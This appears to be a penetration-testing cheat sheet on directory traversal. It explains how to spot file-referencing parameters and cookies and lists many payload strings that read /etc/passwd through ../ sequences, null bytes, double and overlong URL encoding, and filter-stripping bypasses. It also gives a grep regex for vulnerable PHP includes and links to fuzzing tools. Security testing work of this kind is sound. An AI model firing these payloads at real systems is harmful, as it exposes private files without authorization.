# Directory Traversal

> Directory Traversal aims to access files and directories that are stored outside the web root folder. By manipulating variables that reference files with “dot-dot-slash (../)” sequences and its variations or by using absolute file paths, it may be possible to access arbitrary files and directories stored on file system.

## Identifying Vulnerability

We can identify this type of vulnerability by inspecting the URL query strings or the body in search of values that reference files. Example:

```bash
.php?file=$FILE
.cgi?home=$FILE
.jsp?item=$FILE
```

Cookies can also be used  by the web application for the dynamic generation of pages or templates:

```bash
Cookie: ID=d9ccd3f4f9f18cc1:.....TEMPLATE=$TEMPLATE
Cookie: USER=1826cc8f:PSTYLE=$FILE
```
_____

## Exploiting Vulnerability

To successfully test for this flaw, the tester needs to have knowledge of the system being tested and the location of the files being requested. There is no point requesting /etc/passwd from an IIS web server.

```bash
#Parameter:
.php?file=../../../../etc/passwd
#Cookie:
Cookie: USER=24dedbeef44:PSTYLE=../../../../etc/passwd
```

_____

## Bypass Restrictions

#### Traversal sequences stripped non-recursively:

```bash
.php?page=....//....//....//etc/passwd
.php?page=....\/....\/....\/etc/passwd
.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
```

#### Null byte (%00):

Bypass the append more chars at the end of the provided string (bypass of: $_GET['param']."php"):

```bash
.php?page=../../../etc/passwd%00
```
**Note:** Solved since PHP 5.4

#### Encoding:

You could use non-standard encondings like double URL encode (and others):

```bash
.php?page=..%252f..%252f..%252fetc%252fpasswd
.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
.php?page=%252e%252e%252fetc%252fpasswd
.php?page=%252e%252e%252fetc%252fpasswd%00
```
#### From existent folder:

Maybe the back-end is checking the folder path:

```bash
.php?page=utils/scripts/../../../../../etc/passwd
```

#### Filter bypass tricks:

```bash
.php?page=....//....//etc/passwd
.php?page=..///////..////..//////etc/passwd
.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
.php?page=/var/www/../../etc/passwd
```

_____

## Gray-Box Testing

Since gray box testing allows review of the source code, it is possible to search the input vectors more easily and accurately. Use simple tools (such as the grep command) to search for one or more common patterns within the application code: inclusion functions/methods, filesystem operations, and so on.

**Vulnerable functions:**

```bash
PHP: include(), include_once(), require(), require_once(), fopen(), readfile(), ...
JSP/Servlet: java.io.File(), java.io.FileReader(), ...
ASP: include file, include virtual, ...
```

```bash
PHP Regex: (include|require)(_once)?\s*['"(]?\s*\$_(GET|POST|COOKIE)
```


## Tools

 [DotDotPwn - The Directory Traversal Fuzzer](https://github.com/wireghoul/dotdotpwn)
 
 [Sqlmap just for LFI/RFI bugs instead of sql injection](https://github.com/kurobeats/fimap)
 
 ## Wordlists
 
 [Path Traversal Fuzz Strings (from WFuzz Tool)](https://github.com/xmendez/wfuzz/blob/master/wordlist/Injections/Traversal.txt)
 
 [More Traversal Strings](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt)
 
